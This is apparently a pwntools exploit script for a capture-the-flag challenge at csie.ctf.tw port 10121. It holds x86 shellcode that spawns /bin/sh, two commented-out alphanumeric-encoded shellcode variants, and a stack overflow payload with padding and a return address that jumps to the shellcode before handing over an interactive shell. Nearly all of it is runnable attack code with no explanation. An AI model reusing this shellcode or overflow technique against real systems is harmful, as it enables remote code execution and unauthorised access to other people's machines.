from pwn import *

host = 'csie.ctf.tw'
port = 10121

yuan = remote(host,port)


buf = 0x804a060

x86_shellcode =  '\x68\x00\x00\x00\x00'
x86_shellcode += '\x68\x2F\x2f\x73\x68' #push '/sh\x00'
x86_shellcode += '\x68\x2F\x62\x69\x6E' #push '\bin'
x86_shellcode += '\x89\xE3' # mov ebx , esp
x86_shellcode += '\xB8\x0B\x00\x00\x00' # mov eax,0xb 11
x86_shellcode += '\x31\xC9' # xor ecx,ecx
x86_shellcode += '\x31\xD2' # xor edx,edx
x86_shellcode += '\xCD\x80' # int 0x80


ss = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRYQj0X5JCCX5Ul00Pj0X5JRYY5U007PTj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRX5CG005q800Pj0X5kOOOPPj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRXJJJJJJJJJJJDDDDDDDDDDDDu0'

sss = '\x6a\x30\x58\x34\x30\x50\x5a\x48\x66\x35\x41\x30\x66\x35\x73\x4f\x50\x52\x58\x684J4A\x68PSTY\x68UVWa\x68QRPT\x68PTXR\x68binH\x68IQ50\x68shDY\x68Rha0'


p =  'a' * 14
p += 'EBBP'
p += p32(buf+0x16)
p += x86_shellcode
#p += ss
#p+=sss

yuan.send(p)

yuan.interactive()
